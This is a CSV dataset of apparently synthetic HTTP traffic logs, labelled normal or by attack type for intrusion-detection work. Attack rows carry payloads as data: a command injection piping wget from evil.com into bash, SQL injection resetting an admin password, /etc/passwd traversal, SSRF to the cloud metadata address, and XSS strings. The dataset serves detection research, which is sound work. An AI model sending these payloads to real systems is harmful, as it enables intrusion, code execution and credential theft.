timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-13 04:03:53,104.18.24.130,203.0.113.45,https,get,/ping?ip=127.0.0.1| ping -n 10 127.0.0.1,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,5213,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,| ping -n 10 127.0.0.1,command_injection,4,4,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-22 01:20:27,10.0.0.225,10.0.0.1,https,post,/js/script.js,"{""Host"":""10.0.0.1"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",username=john_doe&password=pass123,404,1327,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,1,6,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,python-requests/2.28.0,*/*,text/html,Cloudflare
2026-03-04 16:48:31,192.168.1.203,104.18.24.12,http,get,/contact,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,788,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,16,2,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",192.168.1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare
2026-03-02 10:52:24,172.67.128.195,172.67.128.45,https,get,/traceroute?host=| wget -o- http://evil.com | bash,"{""Host"":""10.0.0.1"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,629,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,| wget -o- http://evil.com | bash,command_injection,10,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,XSStrike/3.1.5,*/*,text/html,nginx
2026-03-03 13:59:33,104.18.24.118,198.51.100.23,http,post,/comment,"{""Host"":""52.45.123.89"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",comment=console.log%28%27XSS%27%29,401,3627,"{""Content-Type"":""text/html"",""Server"":""IIS""}",SQLmap/1.8.4,console.log('xss'),xss,13,1,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,IIS
2026-03-15 20:53:45,172.67.128.110,52.45.123.89,https,get,/products,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,404,3099,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,20,6,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Cloudflare
2026-03-18 16:49:44,192.168.1.225,203.0.113.45,http,get,/ping?ip=127.0.0.1| whoami,"{""Host"":""198.51.100.23"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,403,4870,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,| whoami,command_injection,16,2,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,BurpSuite/2023.12,*/*,text/html,Apache
2026-03-03 07:27:28,172.67.128.153,10.0.0.1,https,get,/,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,3288,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,7,1,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-02 18:56:41,172.16.0.20,34.120.45.67,http,post,/login,"{""Host"":""10.0.0.1"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",username=john&password=admin123,500,3344,"{""Content-Type"":""text/html"",""Server"":""Apache""}",SQLmap/1.8.4,username=john&password=admin123,credential_stuffing_brute_force,18,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,SQLmap/1.8.4,*/*,text/html,Apache
2026-03-01 16:54:29,172.16.0.174,10.0.0.1,http,post,/css/style.css,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",comment=Great article!,200,4070,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,16,6,1,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache
2026-03-08 06:29:50,10.0.0.161,172.67.128.45,http,post,/login,"{""Host"":""52.45.123.89"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",email=test4@test.com&password=root,404,1403,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,email=test4@test.com&password=root,credential_stuffing_brute_force,6,6,1,1,"{'Host': '52.45.123.89', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-03 08:13:14,10.0.0.135,3.12.45.78,http,get,/login?user=laptop,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,623,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,8,1,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",52.45.123.89,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-14 03:05:12,10.0.0.200,185.199.108.153,https,get,/js/script.js?page=home,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,301,1239,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,3,5,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx
2026-03-05 13:10:32,172.67.128.218,198.51.100.23,http,post,/images/logo.png,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",comment=Great article!,200,2369,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,13,3,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",172.67.128.45,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Cloudflare
2026-03-21 16:14:17,192.168.1.62,34.120.45.67,https,get,/register,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,4916,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,16,5,1,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-23 06:54:34,192.168.1.109,104.18.24.12,https,post,/login,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=bob&password=password123,500,3500,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,username=bob&password=password123,credential_stuffing_brute_force,6,0,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-14 09:09:54,10.0.0.135,172.67.128.45,http,get,/traceroute?host=| ping -c 10 127.0.0.1,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,302,7325,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,| ping -c 10 127.0.0.1,command_injection,9,5,1,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-16 16:46:05,192.168.1.1,203.0.113.45,https,get,/proxy?target=http://169.254.169.254.xip.io,"{""Host"":""52.45.123.89"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,500,3251,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,http://169.254.169.254.xip.io/,ssrf,16,0,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-01 12:38:32,172.16.0.43,104.18.24.12,https,get,/settings,"{""Host"":""34.120.45.67"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,200,3174,"{""Content-Type"":""text/html"",""Server"":""nginx""}",wget/1.21.2,,normal,12,6,1,0,"{'Host': '34.120.45.67', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,wget/1.21.2,*/*,text/html,nginx
2026-03-18 05:50:07,172.67.128.236,34.120.45.67,http,get,/search?q='; update users set password='hacked' where username='admin'--,"{""Host"":""104.18.24.12"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,404,3677,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,'; update users set password='hacked' where username='admin'--,sql_injection,5,2,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-12 01:06:05,192.168.1.247,192.168.1.1,https,get,/products,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,302,4779,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,1,3,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-10 09:10:49,172.16.0.207,34.120.45.67,https,get,/ping?ip=127.0.0.1-e /bin/bash,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,7939,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,-e /bin/bash,command_injection,9,1,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-09 23:17:05,192.168.1.55,198.51.100.23,http,get,/products?limit=1,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,2049,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,23,0,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx
2026-03-08 03:24:02,203.0.113.17,203.0.113.45,https,get,/blog?q=1,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,868,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,3,6,1,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-18 14:37:52,104.18.24.157,203.0.113.45,https,get,/login,"{""Host"":""203.0.113.45"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,2756,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,14,2,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,curl/7.81.0,*/*,text/html,nginx
2026-03-24 09:50:38,10.0.0.82,172.67.128.45,http,post,/comment,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",comment=javascript%3Aalert%28%27DOM%20XSS%27%29,302,5638,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,javascript:alert('dom xss'),xss,9,1,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-01 15:13:59,10.0.0.24,185.199.108.153,https,get,/view?path=../../../../etc/passwd,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,497,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,../../../../etc/passwd,directory_traversal,15,6,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache
2026-03-17 01:36:06,172.16.0.34,3.12.45.78,https,get,/search,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,4813,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,1,1,0,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-20 13:06:02,10.0.0.34,104.18.24.12,https,post,/js/script.js,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",search_query=laptops,404,2075,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,13,4,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,nginx
2026-03-11 03:58:42,104.18.24.124,192.168.1.1,http,get,"/login?user=' or if(1=1, sleep(5), 0)--","{""Host"":""3.12.45.78"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,403,4793,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,"' or if(1=1, sleep(5), 0)--",sql_injection,3,2,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,BurpSuite/2023.12,*/*,text/html,Apache
2026-03-18 04:50:25,185.199.108.117,192.168.1.1,https,get,/dashboard,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,3138,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,4,2,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Apache
2026-03-23 00:03:55,172.16.0.232,10.0.0.1,http,get,https://amazon-order-confirmation.net/login,"{""Host"":""3.12.45.78"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,404,5838,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,amazon-order-confirmation.net,typosquatting_url_spoofing,0,0,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Nikto/2.5.0,*/*,text/html,nginx
2026-03-22 21:34:00,10.0.0.146,172.67.128.45,https,get,/fetch?url=http://localhost:8080/admin,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,797,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,http://localhost:8080/admin,ssrf,21,6,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-21 09:22:26,10.0.0.195,52.45.123.89,https,get,/download/file.pdf,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,200,1676,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,9,5,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx
2026-03-11 10:28:59,104.18.24.182,192.168.1.1,https,get,/view?path=../../../../etc/passwd%00.jpg,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,4056,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,../../../../etc/passwd.jpg,directory_traversal,10,2,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",52.45.123.89,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
